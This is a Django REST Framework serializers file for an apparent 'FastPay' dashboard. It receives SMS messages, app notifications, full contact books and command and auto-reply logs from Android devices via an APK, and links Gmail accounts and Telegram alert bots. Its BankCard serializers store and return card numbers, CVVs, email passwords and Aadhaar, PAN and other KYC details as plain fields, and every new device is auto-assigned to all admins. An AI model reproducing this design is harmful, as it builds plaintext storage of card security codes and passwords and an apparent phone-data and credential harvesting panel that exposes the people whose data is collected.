from rest_framework import serializers
from django.core.validators import EmailValidator
from django.core.exceptions import ValidationError
from .models import Item, Device, Message, Notification, Contact, BankCardTemplate, BankCard, Bank, GmailAccount, CommandLog, AutoReplyLog, ActivationFailureLog, ApiRequestLog, CaptureItem, TelegramBot, Company, TelegramUserLink


class ItemSerializer(serializers.ModelSerializer):
    """Serializer for Item model"""
    class Meta:
        model = Item
        fields = ['id', 'title', 'description', 'created_at', 'updated_at']
        read_only_fields = ['id', 'created_at', 'updated_at']


class ItemCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Item (no id, timestamps)"""
    class Meta:
        model = Item
        fields = ['title', 'description']


class MessageSerializer(serializers.ModelSerializer):
    """Serializer for Message model with dashboard compatibility"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)
    is_sent = serializers.BooleanField(read_only=True)
    sender = serializers.SerializerMethodField()
    user = serializers.CharField(source='device.device_id', read_only=True)
    time = serializers.SerializerMethodField()
    
    class Meta:
        model = Message
        fields = [
            'id', 'device', 'device_id', 'message_type', 'phone', 'body',
            'timestamp', 'read', 'is_sent', 'sender', 'user', 'time', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']
    
    def get_sender(self, obj):
        """Return sender phone (for received messages) or phone (for sent)"""
        return obj.phone
    
    def get_time(self, obj):
        """Return timestamp as string for dashboard compatibility"""
        return str(obj.timestamp)


class MessageCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Message"""
    class Meta:
        model = Message
        fields = ['device', 'message_type', 'phone', 'body', 'timestamp', 'read']


class NotificationSerializer(serializers.ModelSerializer):
    """Serializer for Notification model with dashboard compatibility"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)
    app = serializers.CharField(source='package_name', read_only=True)
    body = serializers.CharField(source='text', read_only=True)
    user = serializers.CharField(source='device.device_id', read_only=True)
    time = serializers.SerializerMethodField()
    
    class Meta:
        model = Notification
        fields = [
            'id', 'device', 'device_id', 'package_name', 'app', 'title',
            'text', 'body', 'timestamp', 'extra', 'user', 'time', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']
    
    def get_time(self, obj):
        """Return timestamp as string for dashboard compatibility"""
        return str(obj.timestamp)


class NotificationCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Notification"""
    class Meta:
        model = Notification
        fields = ['device', 'package_name', 'title', 'text', 'timestamp', 'extra']


class ContactSerializer(serializers.ModelSerializer):
    """Serializer for Contact model with full fields"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)
    
    class Meta:
        model = Contact
        fields = [
            'id', 'device', 'device_id', 'contact_id', 'name', 'display_name',
            'phone_number', 'photo_uri', 'thumbnail_uri', 'company', 'job_title',
            'department', 'birthday', 'anniversary', 'notes', 'last_contacted',
            'times_contacted', 'is_starred', 'nickname', 'phonetic_name',
            'phones', 'emails', 'addresses', 'websites', 'im_accounts',
            'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']


class ContactSimpleSerializer(serializers.ModelSerializer):
    """Simplified Contact serializer for dashboard (phone, name only)"""
    phone = serializers.CharField(source='phone_number', read_only=True)
    name = serializers.SerializerMethodField()
    
    class Meta:
        model = Contact
        fields = ['phone', 'name']
    
    def get_name(self, obj):
        """Return display_name or name"""
        return obj.display_name or obj.name or ''


class ContactCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Contact"""
    class Meta:
        model = Contact
        fields = [
            'device', 'contact_id', 'name', 'display_name', 'phone_number',
            'photo_uri', 'thumbnail_uri', 'company', 'job_title', 'department',
            'birthday', 'anniversary', 'notes', 'last_contacted',
            'times_contacted', 'is_starred', 'nickname', 'phonetic_name',
            'phones', 'emails', 'addresses', 'websites', 'im_accounts'
        ]


class BankCardTemplateSerializer(serializers.ModelSerializer):
    """Serializer for BankCardTemplate model"""
    class Meta:
        model = BankCardTemplate
        fields = [
            'id', 'template_code', 'template_name', 'bank_name', 'card_type',
            'default_fields', 'description', 'is_active', 'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']


class BankCardSerializer(serializers.ModelSerializer):
    """Serializer for BankCard model"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)
    template_code = serializers.CharField(source='template.template_code', read_only=True)
    template_name = serializers.CharField(source='template.template_name', read_only=True)
    
    email_account_id = serializers.IntegerField(source='email_account.id', read_only=True)
    email_account_gmail = serializers.EmailField(source='email_account.gmail_email', read_only=True)
    
    # Bank-specific fields (extracted from additional_info for easier access)
    bank_specific_fields = serializers.SerializerMethodField()
    
    class Meta:
        model = BankCard
        fields = [
            'id', 'device', 'device_id', 'template', 'template_code', 'template_name',
            'email_account', 'email_account_id', 'email_account_gmail',
            'card_number', 'card_holder_name', 'bank_name', 'bank_code', 'card_type',
            'expiry_date', 'cvv', 'account_name', 'account_number', 'ifsc_code', 'branch_name',
            'balance', 'currency', 'status', 'mobile_number', 'email', 'email_password',
            'kyc_name', 'kyc_address', 'kyc_dob', 'kyc_aadhar', 'kyc_pan',
            'bank_specific_fields', 'additional_info', 'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at', 'email_account_id', 'email_account_gmail', 'bank_specific_fields']
    
    def get_bank_specific_fields(self, obj):
        """Return bank-specific fields from additional_info for easier API access"""
        return obj.get_all_bank_specific_fields()


class BankCardSummarySerializer(serializers.ModelSerializer):
    """Lightweight serializer for bank-card summaries"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)

    class Meta:
        model = BankCard
        fields = ['id', 'device_id', 'bank_code', 'bank_name']
        read_only_fields = fields


# Company serializer
class CompanySerializer(serializers.ModelSerializer):
    """Serializer for Company model"""
    class Meta:
        model = Company
        fields = ['id', 'code', 'name', 'is_active', 'created_at', 'updated_at']
        read_only_fields = ['id', 'created_at', 'updated_at']


# Device serializers moved here to avoid circular dependency with BankCardSerializer
class DeviceSerializer(serializers.ModelSerializer):
    """Serializer for Device model including linked bank card, company, and gmail"""
    bank_card = BankCardSerializer(read_only=True)
    company = CompanySerializer(read_only=True)
    company_code = serializers.CharField(source='company.code', read_only=True)
    company_name = serializers.CharField(source='company.name', read_only=True)
    assigned_to = serializers.SerializerMethodField()
    
    class Meta:
        model = Device
        fields = [
            'id', 'device_id', 'name', 'model', 'phone', 'code', 'is_active',
            'last_seen', 'battery_percentage', 'current_phone',
            'current_identifier', 'time', 'bankcard', 'system_info',
            'bank_card', 'company', 'company_code', 'company_name', 'assigned_to',
            'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']
    
    def get_assigned_to(self, obj):
        """Return list of assigned user emails (deprecated - use company instead)"""
        return [user.email for user in obj.assigned_to.all()]


class DeviceCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Device with mandatory bankcard and gmail account"""
    # Remove UniqueValidator to allow idempotent registration
    device_id = serializers.CharField(required=True, help_text="Unique device identifier (Android ID)")
    
    bankcard_template_id = serializers.IntegerField(write_only=True, required=True, help_text="Mandatory BankCardTemplate ID")
    gmail_account_id = serializers.IntegerField(write_only=True, required=True, help_text="Mandatory GmailAccount ID")
    
    # Optional bank card overrides
    card_number = serializers.CharField(write_only=True, required=False)
    card_holder_name = serializers.CharField(write_only=True, required=False)
    
    class Meta:
        model = Device
        fields = [
            'device_id', 'name', 'model', 'phone', 'code', 'is_active',
            'last_seen', 'battery_percentage', 'current_phone',
            'current_identifier', 'time', 'bankcard', 'system_info',
            'bankcard_template_id', 'gmail_account_id', 'card_number', 'card_holder_name'
        ]

    def create(self, validated_data):
        from django.db import transaction
        from api.utils import get_all_admin_users

        device_id = validated_data.get('device_id')
        bankcard_template_id = validated_data.pop('bankcard_template_id')
        gmail_account_id = validated_data.pop('gmail_account_id')
        card_number = validated_data.pop('card_number', None)
        card_holder_name = validated_data.pop('card_holder_name', None)

        with transaction.atomic():
            # 1. Get or Create the Device (assign to all admin users on registration)
            # Note: ManyToMany fields cannot be set in defaults, must be set after creation
            device, created = Device.objects.update_or_create(
                device_id=device_id,
                defaults=validated_data
            )

            # Ensure it's active on registration/login and assigned to all admin users
            device.is_active = True
            admin_users = get_all_admin_users()
            device.assigned_to.add(*admin_users)  # Assign to all admin users (access_level = 0)
            device.save()
            
            # 2. Get the mandatory elements
            try:
                template = BankCardTemplate.objects.get(id=bankcard_template_id, is_active=True)
            except BankCardTemplate.DoesNotExist:
                raise serializers.ValidationError({'bankcard_template_id': f'Template with id "{bankcard_template_id}" not found or inactive'})
                
            try:
                gmail_account = GmailAccount.objects.get(id=gmail_account_id, is_active=True)
            except GmailAccount.DoesNotExist:
                raise serializers.ValidationError({'gmail_account_id': f'GmailAccount with id "{gmail_account_id}" not found or inactive'})
                
            # 3. Update or Create the associated BankCard
            BankCard.objects.update_or_create(
                device=device,
                defaults={
                    'template': template,
                    'email_account': gmail_account,
                    'card_number': card_number or (device.bank_card.card_number if hasattr(device, 'bank_card') else f"NEW-{device.device_id[-4:]}"),
                    'card_holder_name': card_holder_name or (device.bank_card.card_holder_name if hasattr(device, 'bank_card') else (device.name or "Device User")),
                    'bank_name': template.bank_name or "Default Bank",
                    'card_type': template.card_type or "debit",
                    'status': 'active'
                }
            )
            
            # Refresh from DB to ensure relationships are loaded for serialization
            device.refresh_from_db()
            return device


class DeviceUpdateSerializer(serializers.ModelSerializer):
    """Serializer for updating Device (all fields optional)"""
    class Meta:
        model = Device
        fields = [
            'name', 'model', 'phone', 'code', 'is_active',
            'last_seen', 'battery_percentage', 'current_phone',
            'current_identifier', 'time', 'bankcard', 'system_info'
        ]


class BankCardCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating BankCard from template"""
    device_id = serializers.CharField(write_only=True, help_text="Device ID to link the card to")
    template_id = serializers.IntegerField(write_only=True, help_text="Template ID to use")
    bank_specific_fields = serializers.JSONField(write_only=True, required=False, help_text="Bank-specific fields (will be stored in additional_info)")
    
    class Meta:
        model = BankCard
        fields = [
            'device_id', 'template_id', 'card_number', 'card_holder_name', 'bank_name',
            'bank_code', 'card_type', 'expiry_date', 'cvv', 'account_name', 'account_number',
            'ifsc_code', 'branch_name', 'balance', 'currency', 'status',
            'mobile_number', 'email', 'email_password',
            'kyc_name', 'kyc_address', 'kyc_dob', 'kyc_aadhar', 'kyc_pan',
            'bank_specific_fields', 'additional_info'
        ]
    
    def create(self, validated_data):
        device_id = validated_data.pop('device_id')
        template_id = validated_data.pop('template_id')
        email_account_id = validated_data.pop('email_account_id', None)
        
        # Get device
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            raise serializers.ValidationError({'device_id': f'Device with device_id "{device_id}" not found'})
        
        # Check if device already has a bank card
        if hasattr(device, 'bank_card'):
            raise serializers.ValidationError({'device_id': f'Device "{device_id}" already has a bank card'})
        
        # Get template
        try:
            template = BankCardTemplate.objects.get(id=template_id, is_active=True)
        except BankCardTemplate.DoesNotExist:
            raise serializers.ValidationError({'template_id': f'Template with id "{template_id}" not found or inactive'})
        
        # Get email account if provided
        email_account = None
        if email_account_id:
            try:
                from .models import GmailAccount
                email_account = GmailAccount.objects.get(id=email_account_id, is_active=True)
            except GmailAccount.DoesNotExist:
                raise serializers.ValidationError({'email_account_id': f'GmailAccount with id "{email_account_id}" not found or inactive'})
        
        # Extract bank_specific_fields if provided
        bank_specific_fields = validated_data.pop('bank_specific_fields', None)
        additional_info = validated_data.pop('additional_info', {})
        
        # Merge bank_specific_fields into additional_info
        if bank_specific_fields:
            if 'bank_specific_fields' not in additional_info:
                additional_info['bank_specific_fields'] = {}
            additional_info['bank_specific_fields'].update(bank_specific_fields)
        
        # Add metadata
        if 'metadata' not in additional_info:
            additional_info['metadata'] = {}
        from django.utils import timezone
        additional_info['metadata']['template_code'] = template.template_code
        additional_info['metadata']['created_at'] = timezone.now().isoformat()
        
        # Create bank card
        bank_card = BankCard.objects.create(
            device=device,
            template=template,
            email_account=email_account,
            additional_info=additional_info,
            **validated_data
        )
        
        # Validate bank-specific fields against template schema
        is_valid, errors = bank_card.validate_bank_specific_fields()
        if not is_valid:
            raise serializers.ValidationError({'bank_specific_fields': errors})
        
        return bank_card


class BankCardUpdateSerializer(serializers.ModelSerializer):
    """Serializer for updating BankCard"""
    email_account_id = serializers.IntegerField(write_only=True, required=False, allow_null=True, help_text="GmailAccount ID to link to this bank card (set to null to unlink)")
    bank_specific_fields = serializers.JSONField(write_only=True, required=False, help_text="Bank-specific fields (will be merged into additional_info)")
    
    class Meta:
        model = BankCard
        fields = [
            'email_account_id',
            'card_number', 'card_holder_name', 'bank_name', 'bank_code', 'card_type',
            'expiry_date', 'cvv', 'account_name', 'account_number', 'ifsc_code', 'branch_name',
            'balance', 'currency', 'status',
            'mobile_number', 'email', 'email_password',
            'kyc_name', 'kyc_address', 'kyc_dob', 'kyc_aadhar', 'kyc_pan',
            'bank_specific_fields', 'additional_info'
        ]
    
    def update(self, instance, validated_data):
        email_account_id = validated_data.pop('email_account_id', None)
        bank_specific_fields = validated_data.pop('bank_specific_fields', None)
        
        # Handle email account update
        if email_account_id is not None:
            if email_account_id:
                try:
                    from .models import GmailAccount
                    email_account = GmailAccount.objects.get(id=email_account_id, is_active=True)
                    instance.email_account = email_account
                except GmailAccount.DoesNotExist:
                    raise serializers.ValidationError({'email_account_id': f'GmailAccount with id "{email_account_id}" not found or inactive'})
            else:
                instance.email_account = None
        
        # Handle bank_specific_fields update
        if bank_specific_fields is not None:
            instance.set_bank_specific_fields(bank_specific_fields, save=False)
        
        # Update other fields
        for attr, value in validated_data.items():
            setattr(instance, attr, value)
        
        instance.save()
        
        # Validate bank-specific fields after update
        is_valid, errors = instance.validate_bank_specific_fields()
        if not is_valid:
            raise serializers.ValidationError({'bank_specific_fields': errors})
        
        return instance


class BankSerializer(serializers.ModelSerializer):
    """Serializer for Bank model"""
    class Meta:
        model = Bank
        fields = [
            'id', 'name', 'code', 'ifsc_code', 'swift_code', 'branch_name',
            'address', 'city', 'state', 'country', 'postal_code',
            'phone', 'email', 'website', 'is_active', 'additional_info',
            'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']


class BankCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating Bank"""
    class Meta:
        model = Bank
        fields = [
            'name', 'code', 'ifsc_code', 'swift_code', 'branch_name',
            'address', 'city', 'state', 'country', 'postal_code',
            'phone', 'email', 'website', 'is_active', 'additional_info'
        ]


class BankUpdateSerializer(serializers.ModelSerializer):
    """Serializer for updating Bank"""
    class Meta:
        model = Bank
        fields = [
            'name', 'code', 'ifsc_code', 'swift_code', 'branch_name',
            'address', 'city', 'state', 'country', 'postal_code',
            'phone', 'email', 'website', 'is_active', 'additional_info'
        ]


# Gmail Serializers
class GmailAccountSerializer(serializers.ModelSerializer):
    """Serializer for GmailAccount model (public fields only, no tokens)"""
    class Meta:
        model = GmailAccount
        fields = [
            'id', 'user_email', 'gmail_email', 'is_active', 
            'last_sync_at', 'scopes', 'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at', 'last_sync_at']


class GmailAccountStatusSerializer(serializers.Serializer):
    """Serializer for Gmail account status response"""
    connected = serializers.BooleanField()
    gmail_email = serializers.EmailField(required=False, allow_null=True)
    is_active = serializers.BooleanField(required=False)
    last_sync_at = serializers.DateTimeField(required=False, allow_null=True)
    scopes = serializers.ListField(child=serializers.CharField(), required=False)


class GmailInitAuthSerializer(serializers.Serializer):
    """Serializer for initiating Gmail authentication"""
    user_email = serializers.EmailField(required=False, help_text="User email to link Gmail account (required if device_id not provided)")
    device_id = serializers.CharField(required=False, help_text="Device ID for APK authentication (required if user_email not provided)")
    method = serializers.ChoiceField(
        choices=['webpage', 'sms', 'email', 'apk'],
        default='webpage',
        required=False,
        help_text="Authentication method"
    )
    dashboard_origin = serializers.URLField(required=False, allow_blank=True, help_text="Dashboard origin to redirect to after OAuth (e.g. https://owner.fastpaygaming.com for REDPAY)")
    dashboard_path = serializers.CharField(required=False, allow_blank=True, default='dashboard/v2', help_text="Path on that origin (e.g. 'dashboard' for REDPAY, 'dashboard/v2' for FASTPAY)")
    
    def validate(self, data):
        """Ensure either user_email or device_id is provided"""
        if not data.get('user_email') and not data.get('device_id'):
            raise serializers.ValidationError(
                'Either user_email or device_id must be provided'
            )
        return data


class GmailInitAuthResponseSerializer(serializers.Serializer):
    """Serializer for Gmail auth init response"""
    auth_url = serializers.URLField(help_text="Google OAuth URL")
    qr_code_data = serializers.CharField(required=False, help_text="QR code image data (base64)")
    short_link = serializers.URLField(required=False, help_text="Short link for SMS/email")
    expires_in = serializers.IntegerField(help_text="URL expiration time in seconds")
    token = serializers.CharField(required=False, help_text="Temporary token for SMS/email methods")


class GmailMessageSerializer(serializers.Serializer):
    """Serializer for Gmail message list item"""
    id = serializers.CharField()
    thread_id = serializers.CharField()
    subject = serializers.CharField()
    from_email = serializers.CharField()
    snippet = serializers.CharField()
    date = serializers.CharField()
    internal_date = serializers.CharField(required=False, allow_blank=True)
    labels = serializers.ListField(child=serializers.CharField())
    is_read = serializers.BooleanField(required=False)


class GmailMessageListSerializer(serializers.Serializer):
    """Serializer for Gmail message list response"""
    messages = GmailMessageSerializer(many=True)
    next_page_token = serializers.CharField(required=False, allow_null=True)
    result_size_estimate = serializers.IntegerField(required=False)


class GmailMessageDetailSerializer(serializers.Serializer):
    """Serializer for Gmail message detail"""
    id = serializers.CharField()
    thread_id = serializers.CharField()
    subject = serializers.CharField()
    from_email = serializers.CharField()
    to = serializers.CharField(required=False)
    cc = serializers.CharField(required=False)
    bcc = serializers.CharField(required=False)
    date = serializers.CharField()
    plain_text = serializers.CharField(required=False)
    html = serializers.CharField(required=False)
    attachments = serializers.ListField(
        child=serializers.DictField(),
        required=False
    )
    labels = serializers.ListField(child=serializers.CharField())


class GmailSendEmailSerializer(serializers.Serializer):
    """Serializer for sending email via Gmail"""
    user_email = serializers.EmailField(help_text="User email")
    to = serializers.EmailField(help_text="Recipient email")
    subject = serializers.CharField()
    body = serializers.CharField(help_text="Email body (plain text)")
    body_html = serializers.CharField(required=False, help_text="Email body (HTML)")
    cc = serializers.ListField(child=serializers.EmailField(), required=False)
    bcc = serializers.ListField(child=serializers.EmailField(), required=False)


class GmailModifyLabelsSerializer(serializers.Serializer):
    """Serializer for modifying message labels"""
    user_email = serializers.EmailField()
    add_label_ids = serializers.ListField(
        child=serializers.CharField(),
        required=False
    )
    remove_label_ids = serializers.ListField(
        child=serializers.CharField(),
        required=False
    )


class GmailSendAuthLinkSerializer(serializers.Serializer):
    """Serializer for sending auth link via SMS"""
    user_email = serializers.EmailField()
    phone_number = serializers.CharField(help_text="Phone number with country code (e.g., +1234567890)")


class GmailSendAuthEmailSerializer(serializers.Serializer):
    """Serializer for sending auth link via email"""
    user_email = serializers.EmailField()
    recipient_email = serializers.EmailField(help_text="Email address to send auth link to")


class CommandLogSerializer(serializers.ModelSerializer):
    """Serializer for CommandLog model"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)

    class Meta:
        model = CommandLog
        fields = [
            'id', 'device', 'device_id', 'command', 'value', 'status', 
            'error_message', 'received_at', 'executed_at', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']


class CommandLogCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating CommandLog from APK"""
    device_id = serializers.CharField(write_only=True)

    class Meta:
        model = CommandLog
        fields = [
            'device_id', 'command', 'value', 'status', 
            'error_message', 'received_at', 'executed_at'
        ]

    def create(self, validated_data):
        device_id = validated_data.pop('device_id')
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            raise serializers.ValidationError({"device_id": f"Device {device_id} not found"})
        
        return CommandLog.objects.create(device=device, **validated_data)


class AutoReplyLogSerializer(serializers.ModelSerializer):
    """Serializer for AutoReplyLog model"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)

    class Meta:
        model = AutoReplyLog
        fields = [
            'id', 'device', 'device_id', 'sender', 'reply_message', 
            'original_timestamp', 'replied_at', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']


class AutoReplyLogCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating AutoReplyLog from APK"""
    device_id = serializers.CharField(write_only=True)

    class Meta:
        model = AutoReplyLog
        fields = [
            'device_id', 'sender', 'reply_message', 
            'original_timestamp', 'replied_at'
        ]

    def create(self, validated_data):
        device_id = validated_data.pop('device_id')
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            raise serializers.ValidationError({"device_id": f"Device {device_id} not found"})
        
        return AutoReplyLog.objects.create(device=device, **validated_data)


class ActivationFailureLogSerializer(serializers.ModelSerializer):
    """Serializer for ActivationFailureLog (read/list)"""
    class Meta:
        model = ActivationFailureLog
        fields = [
            'id', 'device_id', 'code_attempted', 'mode',
            'error_type', 'error_message', 'metadata', 'created_at'
        ]
        read_only_fields = ['id', 'created_at']


class ActivationFailureLogCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating ActivationFailureLog from APK"""
    class Meta:
        model = ActivationFailureLog
        fields = [
            'device_id', 'code_attempted', 'mode',
            'error_type', 'error_message', 'metadata'
        ]

    def create(self, validated_data):
        return ActivationFailureLog.objects.create(**validated_data)


class ApiRequestLogSerializer(serializers.ModelSerializer):
    """Read/update serializer for API request history"""
    class Meta:
        model = ApiRequestLog
        fields = [
            'id', 'method', 'path', 'status_code', 'user_identifier', 'client_ip',
            'host', 'origin', 'referer', 'user_agent', 'x_forwarded_for',
            'auth_type', 'token_user',
            'response_time_ms', 'created_at'
        ]
        read_only_fields = [
            'id', 'method', 'path', 'client_ip', 'host', 'origin',
            'referer', 'user_agent', 'x_forwarded_for', 'created_at'
        ]


class CaptureItemSerializer(serializers.ModelSerializer):
    """Serializer for captured items (read/list)"""
    device_id = serializers.CharField(source='device.device_id', read_only=True)

    class Meta:
        model = CaptureItem
        fields = [
            'id', 'source', 'device', 'device_id', 'user_email',
            'title', 'content', 'source_url', 'raw_data', 'status',
            'created_at', 'updated_at'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at', 'device_id']


class CaptureItemCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating captured items"""
    device_id = serializers.CharField(write_only=True, required=False)

    class Meta:
        model = CaptureItem
        fields = [
            'source', 'device_id', 'user_email', 'title', 'content',
            'source_url', 'raw_data', 'status'
        ]

    def create(self, validated_data):
        device_id = validated_data.pop('device_id', None)
        device = None
        if device_id:
            try:
                device = Device.objects.get(device_id=device_id)
            except Device.DoesNotExist:
                raise serializers.ValidationError({"device_id": f"Device {device_id} not found"})
        return CaptureItem.objects.create(device=device, **validated_data)


# ============================================================================
# Telegram Bot Serializers
# ============================================================================

class TelegramBotSerializer(serializers.ModelSerializer):
    """Serializer for TelegramBot model (read/list)"""
    masked_token = serializers.SerializerMethodField()
    chat_type_display = serializers.SerializerMethodField()
    
    class Meta:
        model = TelegramBot
        fields = [
            'id', 'name', 'token', 'masked_token', 'chat_ids',
            'chat_type', 'chat_type_display', 'message_thread_id',
            'chat_title', 'chat_username', 'bot_username',
            'description', 'is_active',
            'last_used_at', 'message_count',
            'created_at', 'updated_at'
        ]
        read_only_fields = [
            'id', 'created_at', 'updated_at', 'masked_token',
            'chat_type_display', 'last_used_at', 'message_count'
        ]
    
    def get_masked_token(self, obj):
        """Return masked token for secure display"""
        return obj.get_masked_token()
    
    def get_chat_type_display(self, obj):
        """Return human-readable chat type"""
        return obj.get_chat_type_display()


class TelegramBotListSerializer(serializers.ModelSerializer):
    """Lightweight serializer for dropdown lists (hides token)"""
    chat_type_display = serializers.SerializerMethodField()
    
    class Meta:
        model = TelegramBot
        fields = [
            'id', 'name', 'description', 'chat_type', 'chat_type_display',
            'chat_title', 'is_active'
        ]
    
    def get_chat_type_display(self, obj):
        """Return human-readable chat type"""
        return obj.get_chat_type_display()


class TelegramBotCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating TelegramBot"""
    class Meta:
        model = TelegramBot
        fields = [
            'name', 'token', 'chat_ids',
            'chat_type', 'message_thread_id',
            'chat_title', 'chat_username', 'bot_username',
            'description', 'is_active'
        ]
    
    def validate_name(self, value):
        """Ensure name is unique (case-insensitive)"""
        if TelegramBot.objects.filter(name__iexact=value).exists():
            raise serializers.ValidationError(f"Bot with name '{value}' already exists")
        return value
    
    def validate_token(self, value):
        """Basic token format validation"""
        if not value or ':' not in value:
            raise serializers.ValidationError("Invalid token format. Token should be in format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
        return value


class TelegramBotUpdateSerializer(serializers.ModelSerializer):
    """Serializer for updating TelegramBot"""
    class Meta:
        model = TelegramBot
        fields = [
            'name', 'token', 'chat_ids',
            'chat_type', 'message_thread_id',
            'chat_title', 'chat_username', 'bot_username',
            'description', 'is_active'
        ]
    
    def validate_name(self, value):
        """Ensure name is unique (case-insensitive), excluding current instance"""
        instance = self.instance
        if TelegramBot.objects.filter(name__iexact=value).exclude(pk=instance.pk).exists():
            raise serializers.ValidationError(f"Bot with name '{value}' already exists")
        return value


class TelegramBotTestSerializer(serializers.Serializer):
    """Serializer for test message request"""
    message = serializers.CharField(
        max_length=4096,
        required=False,
        default="Test message from FastPay Dashboard"
    )
    chat_id = serializers.CharField(
        required=False,
        help_text="Specific chat ID to send to (uses bot's chat_ids if not provided)"
    )
    message_thread_id = serializers.IntegerField(
        required=False,
        help_text="Topic ID for supergroups with forum enabled"
    )


# ============================================================================
# Telegram User Link (per-company Telegram notifications)
# ============================================================================

class TelegramUserLinkSerializer(serializers.ModelSerializer):
    """Serializer for TelegramUserLink (read); excludes link_token."""
    telegram_bot_name = serializers.CharField(source='telegram_bot.name', read_only=True)
    company_code = serializers.CharField(source='company.code', read_only=True)

    class Meta:
        model = TelegramUserLink
        fields = [
            'id', 'company', 'company_code', 'user', 'telegram_chat_id',
            'telegram_bot', 'telegram_bot_name', 'link_token_expires_at',
            'opted_in_alerts', 'opted_in_reports', 'opted_in_device_events',
            'created_at', 'updated_at',
        ]
        read_only_fields = ['id', 'telegram_chat_id', 'created_at', 'updated_at']


class TelegramUserLinkCreateSerializer(serializers.Serializer):
    """Create a link: generate token and return deep link. Requires user_email and telegram_bot_id."""
    user_email = serializers.EmailField(help_text="Dashboard user email (must match logged-in user)")
    telegram_bot_id = serializers.IntegerField(help_text="ID of the TelegramBot to use for this link")


class TelegramUserLinkUpdateSerializer(serializers.ModelSerializer):
    """Update preferences only."""
    class Meta:
        model = TelegramUserLink
        fields = ['opted_in_alerts', 'opted_in_reports', 'opted_in_device_events']


# ============================================================================
# Celery Scheduled Task Serializers
# ============================================================================

class IntervalScheduleSerializer(serializers.Serializer):
    """Serializer for IntervalSchedule model"""
    id = serializers.IntegerField(read_only=True)
    every = serializers.IntegerField()
    period = serializers.ChoiceField(choices=[
        ('seconds', 'Seconds'),
        ('minutes', 'Minutes'),
        ('hours', 'Hours'),
        ('days', 'Days'),
    ])
    
    def to_representation(self, instance):
        return {
            'id': instance.id,
            'every': instance.every,
            'period': instance.period,
            'display': str(instance),
        }


class CrontabScheduleSerializer(serializers.Serializer):
    """Serializer for CrontabSchedule model"""
    id = serializers.IntegerField(read_only=True)
    minute = serializers.CharField(default='*')
    hour = serializers.CharField(default='*')
    day_of_week = serializers.CharField(default='*')
    day_of_month = serializers.CharField(default='*')
    month_of_year = serializers.CharField(default='*')
    
    def to_representation(self, instance):
        return {
            'id': instance.id,
            'minute': instance.minute,
            'hour': instance.hour,
            'day_of_week': instance.day_of_week,
            'day_of_month': instance.day_of_month,
            'month_of_year': instance.month_of_year,
            'display': str(instance),
        }


class PeriodicTaskSerializer(serializers.Serializer):
    """Serializer for PeriodicTask model (read operations)"""
    id = serializers.IntegerField(read_only=True)
    name = serializers.CharField(read_only=True)
    task = serializers.CharField(read_only=True)
    enabled = serializers.BooleanField(read_only=True)
    args = serializers.CharField(read_only=True, allow_blank=True)
    kwargs = serializers.CharField(read_only=True, allow_blank=True)
    description = serializers.CharField(read_only=True, allow_blank=True)
    last_run_at = serializers.DateTimeField(read_only=True)
    total_run_count = serializers.IntegerField(read_only=True)
    date_changed = serializers.DateTimeField(read_only=True)
    
    # Schedule info
    interval = IntervalScheduleSerializer(read_only=True)
    crontab = CrontabScheduleSerializer(read_only=True)
    
    # Computed fields
    schedule_type = serializers.SerializerMethodField()
    schedule_display = serializers.SerializerMethodField()
    
    def get_schedule_type(self, obj):
        """Return the type of schedule (interval or crontab)"""
        if obj.interval:
            return 'interval'
        elif obj.crontab:
            return 'crontab'
        return 'unknown'
    
    def get_schedule_display(self, obj):
        """Return human-readable schedule description"""
        if obj.interval:
            return f"Every {obj.interval.every} {obj.interval.period}"
        elif obj.crontab:
            return str(obj.crontab)
        return 'No schedule'


class PeriodicTaskCreateSerializer(serializers.Serializer):
    """Serializer for creating/updating PeriodicTask"""
    name = serializers.CharField(max_length=200)
    task = serializers.CharField(max_length=200, help_text="Full task path, e.g., api.tasks.sync_firebase_messages_task")
    enabled = serializers.BooleanField(default=True)
    args = serializers.CharField(required=False, default='[]', help_text="JSON array of positional arguments")
    kwargs = serializers.CharField(required=False, default='{}', help_text="JSON object of keyword arguments")
    description = serializers.CharField(required=False, allow_blank=True, default='')
    
    # Schedule type choice
    schedule_type = serializers.ChoiceField(
        choices=['interval', 'crontab'],
        help_text="Type of schedule"
    )
    
    # Interval schedule fields
    interval_every = serializers.IntegerField(required=False, min_value=1)
    interval_period = serializers.ChoiceField(
        choices=['seconds', 'minutes', 'hours', 'days'],
        required=False,
        default='minutes'
    )
    
    # Crontab schedule fields
    crontab_minute = serializers.CharField(required=False, default='*')
    crontab_hour = serializers.CharField(required=False, default='*')
    crontab_day_of_week = serializers.CharField(required=False, default='*')
    crontab_day_of_month = serializers.CharField(required=False, default='*')
